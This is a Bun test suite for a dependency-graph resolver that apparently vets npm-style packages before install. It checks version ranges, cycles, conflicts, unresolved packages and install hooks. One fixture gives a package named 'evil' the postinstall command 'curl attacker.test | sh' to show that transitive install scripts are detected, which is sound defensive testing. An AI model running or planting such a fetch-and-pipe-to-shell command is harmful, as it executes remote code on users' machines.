import { expect, test } from "bun:test";
import { type Packument, resolveGraph } from "../../src/graph/resolve.ts";

type Spec = Record<
  string,
  Record<
    string,
    {
      dependencies?: Record<string, string>;
      optionalDependencies?: Record<string, string>;
      scripts?: Record<string, string>;
      deprecated?: string;
      os?: string[];
      integrity?: string;
    }
  >
>;

function registry(spec: Spec, tags: Record<string, string> = {}) {
  const calls: string[] = [];
  const packument = async (name: string): Promise<Packument | null> => {
    calls.push(name);
    const versions = spec[name];
    if (!versions) return null;
    const list = Object.keys(versions);
    return {
      name,
      "dist-tags": { latest: tags[name] ?? (list.at(-1) as string) },
      versions: Object.fromEntries(
        list.map((version) => {
          const meta = versions[version] as NonNullable<Spec[string][string]>;
          return [
            version,
            {
              version,
              ...(meta.dependencies ? { dependencies: meta.dependencies } : {}),
              ...(meta.optionalDependencies
                ? { optionalDependencies: meta.optionalDependencies }
                : {}),
              ...(meta.scripts ? { scripts: meta.scripts } : {}),
              ...(meta.deprecated ? { deprecated: meta.deprecated } : {}),
              ...(meta.os ? { os: meta.os } : {}),
              dist: {
                tarball: `https://reg.test/${name}-${version}.tgz`,
                integrity: meta.integrity ?? `sha512-${name}${version}`,
              },
            },
          ];
        }),
      ),
    };
  };
  return { packument, calls };
}

test("a direct package pulls its whole transitive closure, which is the entire point", async () => {
  const { packument } = registry({
    app: { "1.0.0": { dependencies: { mid: "^1.0.0" } } },
    mid: { "1.0.0": { dependencies: { leaf: "^2.0.0" } } },
    leaf: { "2.0.0": {}, "2.1.0": {} },
  });
  const graph = await resolveGraph([{ name: "app", range: "1.0.0" }], { packument });
  expect(graph.nodes.map((node) => `${node.name}@${node.version}`)).toEqual([
    "app@1.0.0",
    "leaf@2.1.0",
    "mid@1.0.0",
  ]);
  expect(graph.complete).toBe(true);
});

test("depth records how far a package is from something the user asked for", async () => {
  const { packument } = registry({
    app: { "1.0.0": { dependencies: { mid: "1.0.0" } } },
    mid: { "1.0.0": { dependencies: { leaf: "1.0.0" } } },
    leaf: { "1.0.0": {} },
  });
  const graph = await resolveGraph([{ name: "app", range: "1.0.0" }], { packument });
  const depth = Object.fromEntries(graph.nodes.map((node) => [node.name, node.depth]));
  expect(depth).toEqual({ app: 0, mid: 1, leaf: 2 });
});

test("requiredBy names who dragged a transitive package in", async () => {
  const { packument } = registry({
    a: { "1.0.0": { dependencies: { shared: "1.0.0" } } },
    b: { "1.0.0": { dependencies: { shared: "1.0.0" } } },
    shared: { "1.0.0": {} },
  });
  const graph = await resolveGraph(
    [
      { name: "a", range: "1.0.0" },
      { name: "b", range: "1.0.0" },
    ],
    { packument },
  );
  const shared = graph.nodes.find((node) => node.name === "shared");
  expect(shared?.requiredBy).toEqual(["a@1.0.0", "b@1.0.0"]);
});

test("each package is fetched once no matter how many dependents it has", async () => {
  const { packument, calls } = registry({
    a: { "1.0.0": { dependencies: { shared: "1.0.0" } } },
    b: { "1.0.0": { dependencies: { shared: "1.0.0" } } },
    shared: { "1.0.0": {} },
  });
  await resolveGraph(
    [
      { name: "a", range: "1.0.0" },
      { name: "b", range: "1.0.0" },
    ],
    { packument },
  );
  expect(calls.filter((name) => name === "shared")).toHaveLength(1);
});

test("a cycle terminates instead of hanging", async () => {
  const { packument } = registry({
    a: { "1.0.0": { dependencies: { b: "1.0.0" } } },
    b: { "1.0.0": { dependencies: { a: "1.0.0" } } },
  });
  const graph = await resolveGraph([{ name: "a", range: "1.0.0" }], { packument });
  expect(graph.nodes).toHaveLength(2);
});

test("a self-referencing package terminates", async () => {
  const { packument } = registry({ a: { "1.0.0": { dependencies: { a: "1.0.0" } } } });
  const graph = await resolveGraph([{ name: "a", range: "1.0.0" }], { packument });
  expect(graph.nodes).toHaveLength(1);
});

test("install hooks are recorded, because that is the code that actually runs", async () => {
  const { packument } = registry({
    a: {
      "1.0.0": {
        scripts: { postinstall: "node build.js", test: "vitest", preinstall: "" },
      },
    },
  });
  const graph = await resolveGraph([{ name: "a", range: "1.0.0" }], { packument });
  expect(graph.nodes[0]?.hooks).toEqual(["postinstall"]);
});

test("a transitive install script is found even though the user never typed that package", async () => {
  const { packument } = registry({
    app: { "1.0.0": { dependencies: { evil: "1.0.0" } } },
    evil: { "1.0.0": { scripts: { postinstall: "curl attacker.test | sh" } } },
  });
  const graph = await resolveGraph([{ name: "app", range: "1.0.0" }], { packument });
  const evil = graph.nodes.find((node) => node.name === "evil");
  expect(evil?.hooks).toEqual(["postinstall"]);
  expect(evil?.depth).toBe(1);
});

test("a dist-tag resolves to the tagged version", async () => {
  const { packument } = registry({ a: { "1.0.0": {}, "2.0.0-beta.1": {} } }, { a: "1.0.0" });
  const graph = await resolveGraph([{ name: "a", range: "latest" }], { packument });
  expect(graph.nodes[0]?.version).toBe("1.0.0");
});

test("an exact version is honoured over the latest tag", async () => {
  const { packument } = registry({ a: { "1.0.0": {}, "2.0.0": {} } }, { a: "2.0.0" });
  const graph = await resolveGraph([{ name: "a", range: "1.0.0" }], { packument });
  expect(graph.nodes[0]?.version).toBe("1.0.0");
});

test("a range picks the highest satisfying version, not simply the newest", async () => {
  const { packument } = registry({ a: { "1.0.0": {}, "1.4.2": {}, "2.0.0": {} } });
  const graph = await resolveGraph([{ name: "a", range: "^1.0.0" }], { packument });
  expect(graph.nodes[0]?.version).toBe("1.4.2");
});

test("a package missing from the registry is reported rather than skipped silently", async () => {
  const { packument } = registry({ app: { "1.0.0": { dependencies: { ghost: "1.0.0" } } } });
  const graph = await resolveGraph([{ name: "app", range: "1.0.0" }], { packument });
  expect(graph.unresolved).toEqual([
    {
      name: "ghost",
      range: "1.0.0",
      reason: "not found on the registry",
      requiredBy: "app@1.0.0",
      optional: false,
    },
  ]);
  expect(graph.complete).toBe(false);
});

test("an unsatisfiable range is reported with its own reason", async () => {
  const { packument } = registry({ a: { "1.0.0": {} } });
  const graph = await resolveGraph([{ name: "a", range: "^9.0.0" }], { packument });
  expect(graph.unresolved[0]?.reason).toBe("no published version satisfies the range");
});

test("a failing registry call degrades to unresolved instead of throwing", async () => {
  const graph = await resolveGraph([{ name: "a", range: "1.0.0" }], {
    packument: () => Promise.reject(new Error("network down")),
  });
  expect(graph.unresolved[0]?.reason).toBe("not found on the registry");
});

test("a missing optional dependency does not make the graph incomplete", async () => {
  const { packument } = registry({
    app: { "1.0.0": { optionalDependencies: { fsevents: "2.0.0" } } },
  });
  const graph = await resolveGraph([{ name: "app", range: "1.0.0" }], { packument });
  expect(graph.unresolved[0]?.optional).toBe(true);
  expect(graph.complete).toBe(true);
});

const EXOTIC = [
  "git+https://github.com/o/r.git",
  "github:owner/repo",
  "https://example.test/pkg.tgz",
  "file:../local",
  "link:../local",
  "workspace:*",
  "portal:../pkg",
];

for (const range of EXOTIC) {
  test(`a ${range.split(":")[0]} source is flagged as outside registry resolution`, async () => {
    const { packument } = registry({});
    const graph = await resolveGraph([{ name: "thing", range }], { packument });
    expect(graph.unresolved[0]?.reason).toBe("not a registry range");
  });
}

test("a version conflict is recorded rather than resolved by guessing", async () => {
  const { packument } = registry({
    a: { "1.0.0": { dependencies: { shared: "^1.0.0" } } },
    b: { "1.0.0": { dependencies: { shared: "^2.0.0" } } },
    shared: { "1.0.0": {}, "2.0.0": {} },
  });
  const graph = await resolveGraph(
    [
      { name: "a", range: "1.0.0" },
      { name: "b", range: "1.0.0" },
    ],
    { packument },
  );
  expect(graph.conflicts).toHaveLength(1);
  expect(graph.conflicts[0]).toMatchObject({ name: "shared", alsoRequired: "^2.0.0" });
});

test("resolution stops at the node budget and says so", async () => {
  const spec: Spec = { root: { "1.0.0": { dependencies: {} } } };
  for (let index = 0; index < 20; index++) {
    (spec.root as Spec[string])["1.0.0"]!.dependencies![`dep${index}`] = "1.0.0";
    spec[`dep${index}`] = { "1.0.0": {} };
  }
  const { packument } = registry(spec);
  const graph = await resolveGraph([{ name: "root", range: "1.0.0" }], { packument, maxNodes: 5 });
  expect(graph.nodes).toHaveLength(5);
  expect(graph.truncated).toBe(true);
  expect(graph.complete).toBe(false);
});

test("deprecation and platform constraints ride along on the node", async () => {
  const { packument } = registry({
    old: { "1.0.0": { deprecated: "use new" } },
    native: { "1.0.0": { os: ["darwin"] } },
  });
  const graph = await resolveGraph(
    [
      { name: "old", range: "1.0.0" },
      { name: "native", range: "1.0.0" },
    ],
    { packument },
  );
  expect(graph.nodes.find((node) => node.name === "old")?.deprecated).toBe(true);
  expect(graph.nodes.find((node) => node.name === "native")?.platformSpecific).toBe(true);
});

test("integrity and tarball come along so the plan can pin what it vetted", async () => {
  const { packument } = registry({ a: { "1.0.0": { integrity: "sha512-known" } } });
  const graph = await resolveGraph([{ name: "a", range: "1.0.0" }], { packument });
  expect(graph.nodes[0]?.integrity).toBe("sha512-known");
  expect(graph.nodes[0]?.tarball).toBe("https://reg.test/a-1.0.0.tgz");
});

test("an optional requirement that a real dependent also needs stops being optional", async () => {
  const { packument } = registry({
    a: { "1.0.0": { optionalDependencies: { shared: "1.0.0" } } },
    b: { "1.0.0": { dependencies: { shared: "1.0.0" } } },
    shared: { "1.0.0": {} },
  });
  const graph = await resolveGraph(
    [
      { name: "a", range: "1.0.0" },
      { name: "b", range: "1.0.0" },
    ],
    { packument },
  );
  expect(graph.nodes.find((node) => node.name === "shared")?.optional).toBe(false);
});

test("an empty root list resolves to an empty complete graph", async () => {
  const { packument } = registry({});
  const graph = await resolveGraph([], { packument });
  expect(graph).toMatchObject({ nodes: [], unresolved: [], complete: true, truncated: false });
});

test("a packument with no versions at all is treated as unresolvable", async () => {
  const graph = await resolveGraph([{ name: "empty", range: "1.0.0" }], {
    packument: async () => ({ name: "empty", versions: {} }),
  });
  expect(graph.unresolved[0]?.reason).toBe("no published version satisfies the range");
});

test("an empty range falls back to latest", async () => {
  const { packument } = registry({ a: { "1.0.0": {}, "2.0.0": {} } }, { a: "2.0.0" });
  const graph = await resolveGraph([{ name: "a", range: "" }], { packument });
  expect(graph.nodes[0]?.version).toBe("2.0.0");
});

test("a star range resolves and never records a conflict against itself", async () => {
  const { packument } = registry({
    a: { "1.0.0": { dependencies: { shared: "*" } } },
    shared: { "1.0.0": {}, "2.0.0": {} },
  });
  const graph = await resolveGraph(
    [
      { name: "a", range: "1.0.0" },
      { name: "shared", range: "1.0.0" },
    ],
    { packument },
  );
  expect(graph.conflicts).toEqual([]);
});
